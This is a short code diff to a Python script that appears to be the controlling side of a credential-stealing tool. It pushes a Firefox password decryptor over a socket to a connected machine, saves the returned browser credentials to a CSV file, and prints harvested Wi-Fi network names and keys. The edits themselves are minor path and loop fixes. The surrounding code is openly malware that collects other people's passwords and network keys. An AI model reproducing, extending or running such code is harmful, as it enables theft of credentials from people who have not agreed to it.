@@ -15,7 +15,7 @@ def write_file(data: bytes, file_name: str) -> None :
         f.write(decoded_data)
 
 def send_decoder(s: socket) -> None :
-    with open('firefox_decrypt.py', 'rb') as f:
+    with open('./firefox_decrypt.py', 'rb') as f:
         data =  f.read()
     data_encoded =  base64.b64encode(data)
     separateur = "\n"
@@ -23,7 +23,7 @@ def send_decoder(s: socket) -> None :
     s.send(separateur.encode('utf-8'))
 
 def write_credential(credential) :
-    with open('credential.csv', mode='w', encoding='utf-8') as file:
+    with open('./credential.csv', mode='w', encoding='utf-8') as file:
         file.write(credential)
 
 def get_credential(conn):
@@ -47,7 +47,7 @@ def get_wifi(conn):
     wifi =  decoded_data.decode('utf-8')
     print("Wifi credential:\nSSID:key")
     wifi = wifi.split("\n")
-    for x in wifi[1:]:
+    for x in wifi:
         print(x)
 
 def main():
